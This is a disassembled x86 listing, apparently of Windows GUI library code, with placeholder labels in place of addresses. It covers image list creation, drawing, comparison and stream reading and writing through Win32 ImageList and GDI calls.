mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_454090
pop ecx
pop edx
pop ebx
retn
sub_45418c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45421c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_454154
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40358c
sub_4541c8
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_454a58
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_42c6a8
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45421c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40358c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_4541b8
push eax
call ImageList_Destroy
sub_454254
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4542e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45407c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4542ee
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov edx eax
mov eax ebx
call sub_45447c
sub_4542f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4543a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_454386
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_454084
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4541c8
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4541c8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45438d
mov eax [ ebp - 0x10 ]
call sub_403390
retn
sub_4543c0
push ebx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4541b8
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_4543e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454463
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4543c0
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45407c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax ebx
mov si 0xffef
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45446a
lea eax [ ebp - 0x4 ]
call sub_404120
retn
push esi
mov eax ebx
call sub_4541b8
push eax
call ImageList_Remove
sub_45447c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_453ecc
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40358c
pop esi
pop ebx
retn
sub_4544b4
push ebx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_4541b8
push eax
call ImageList_GetBkColor
call sub_453eec
pop ebx
retn
sub_4544dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_453ecc
push eax
mov eax ebx
call sub_4544b4
call sub_453ecc
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_427d50
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4541b8
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_42c63c
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_427608
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41a018
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_42c63c
pop edx
call sub_4279ac
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_42c63c
call sub_427d50
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4541b8
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41a018
mov eax [ ebx + 0x54 ]
call sub_42c63c
call sub_427d50
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_427608
mov eax edi
call sub_427d50
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_427608
mov eax edi
call sub_427d50
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42d3ac
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_4546b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_4546d4
pop ebx
pop ebp
retn 0xc
sub_4546d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45407c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_454720
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41a018
mov eax [ ebp - 0x4 ]
call sub_4553b4
xor eax eax
push ebp
push sub_4548b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45489c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45487f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42d3ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454886
mov eax [ ebp - 0x10 ]
call sub_403390
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_42c63c
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4279ac
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_427d50
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_42c63c
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4279ac
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_427d50
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4542f4
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4548c8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4541b8
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_454720
sub_4548e8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
call sub_45421c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41bc50
mov eax ebx
call sub_454470
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_454ad0
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_4541b8
mov edx eax
mov eax ebx
call sub_454154
mov eax ebx
call sub_45407c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4541b8
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_454084
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4541b8
push eax
call ImageList_GetBkColor
call sub_453eec
mov edx eax
mov eax ebx
call sub_45447c
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4548c8
jmp r-xdata
sub_4549a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41bd34
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_454ad0
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_454470
mov eax esi
call sub_4541b8
mov edx eax
mov eax ebx
call sub_454154
mov eax ebx
call sub_45407c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4541b8
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_454084
jmp r-xdata
mov eax esi
call sub_4541b8
push eax
call ImageList_GetBkColor
call sub_453eec
mov edx eax
mov eax ebx
call sub_45447c
mov edx esi
mov eax ebx
call sub_4548c8
pop esi
pop ebx
retn
sub_454a58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454ac4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454acb
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_454af8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_41b654
mov si 0xffff
call sub_40358c
inc ebp
dec edi
jne r-xdata
sub_454b48
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41b544
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41b654
cmp ebp eax
jne r-xdata
sub_454ba0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_4081b0
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_454be4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_4543c0
mov ebx eax
mov eax edi
call sub_4543c0
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4543c0
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454cc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_454ca3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_454ba0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454caa
mov eax [ ebp - 0xc ]
call sub_403390
retn
mov eax edi
call sub_4543c0
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_454cd4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4543c0
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_454be4
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_454d30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_423e20
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_454cd4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454d88
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41ddd0
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41ddd0
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45500c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41dba4
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41dbc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_454fef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42d3ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41a018
mov eax [ ebp - 0x4 ]
call sub_4553b4
xor eax eax
push ebp
push sub_454fd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454fd9
mov eax [ ebp - 0xc ]
call sub_403390
mov eax [ ebp - 0x14 ]
call sub_403390
mov eax [ ebp - 0x4 ]
call sub_4553b8
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41a040
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_42c63c
push eax
mov eax [ ebp - 0xc ]
call sub_42c63c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_427878
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41a040
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42c63c
push eax
mov eax [ ebp - 0x14 ]
call sub_42c63c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_427878
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4542f4
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45501c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245a0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45507c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45418c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455083
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub eax 0xffffffec
sub_455083
mov eax [ ebp - 0x4 ]
call sub_45407c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4551b2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41dbc4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41e2cc
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41dbc4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403390
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41dbc4
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245a0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_455195
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41dbc4
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45418c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41dbc4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_4551e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_45421c
mov eax edi
call sub_41dba4
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41dbc4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_454d88
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45501c
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_455270
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45536a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c4dc
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_4541b8
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_4541b8
push eax
call [ rw-data ]
test eax eax
je r-xdata
